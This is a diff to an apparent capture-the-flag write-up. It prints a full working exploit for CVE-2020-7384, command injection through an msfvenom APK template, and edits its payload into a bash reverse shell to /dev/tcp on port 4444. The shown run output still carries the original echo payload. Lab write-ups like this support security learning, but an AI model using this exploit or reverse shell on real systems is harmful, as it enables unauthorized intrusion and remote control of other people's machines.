@@ -70,3 +70,102 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
 Lets take a look on pcap file:
+
+![pcap](IMG/pcap.png)
+
+It seems that it returns us a funny port scan, but for now nothing interesting on it. The nmap part does a simple nmap, nothing interesting.
+The payload part seems to be interesting as it seems to generate a payload with fsvenom command on server side, with the option to pass a template. Let's search msfvenom exploits:
+
+```shell
+searchsploit msfvenom
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                                       | multiple/local/49491.py
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+```
+
+Let's take a look on this python script:
+
+```python
+# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
+# Exploit Author: Justin Steven
+# Vendor Homepage: https://www.metasploit.com/
+# Software Link: https://www.metasploit.com/
+# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
+# CVE : CVE-2020-7384
+
+#!/usr/bin/env python3
+import subprocess
+import tempfile
+import os
+from base64 import b64encode
+
+# Change me
+payload = 'echo "Code execution as $(id)" > /tmp/win'
+
+# b64encode to avoid badchars (keytool is picky)
+payload_b64 = b64encode(payload.encode()).decode()
+dname = f"CN='|echo {payload_b64} | base64 -d | sh #"
+
+print(f"[+] Manufacturing evil apkfile")
+print(f"Payload: {payload}")
+print(f"-dname: {dname}")
+print()
+
+tmpdir = tempfile.mkdtemp()
+apk_file = os.path.join(tmpdir, "evil.apk")
+empty_file = os.path.join(tmpdir, "empty")
+keystore_file = os.path.join(tmpdir, "signing.keystore")
+storepass = keypass = "password"
+key_alias = "signing.key"
+
+# Touch empty_file
+open(empty_file, "w").close()
+
+# Create apk_file
+subprocess.check_call(["zip", "-j", apk_file, empty_file])
+
+# Generate signing key with malicious -dname
+subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
+                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])
+
+# Sign APK using our malicious dname
+subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
+                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])
+
+print()
+print(f"[+] Done! apkfile is at {apk_file}")
+print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o /dev/null")
+```
+Change payload part:
+
+```python
+# Change me
+#payload = 'echo "Code execution as $(id)" > /tmp/win'
+payload = 'bash -i >& /dev/tcp/0.10.14.33/4444 0>&1' 
+```
+Let's run python script in order to generate apk template:
+
+```shell
+python 49491.py                                                                                            main 
+[+] Manufacturing evil apkfile
+Payload: echo "Code execution as $(id)" > /tmp/win
+-dname: CN='|echo ZWNobyAiQ29kZSBleGVjdXRpb24gYXMgJChpZCkiID4gL3RtcC93aW4= | base64 -d | sh #
+
+  adding: empty (stored 0%)
+jar signed.
+
+Warning: 
+The signer's certificate is self-signed.
+The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
+The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
+POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
+
+[+] Done! apkfile is at /tmp/tmp5fpkc0ot/evil.apk
+Do: msfvenom -x /tmp/tmp5fpkc0ot/evil.apk -p android/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o /dev/null
+Files  cp -p /tmp/tmp5fpkc0ot/evil.apk . 
+```
+
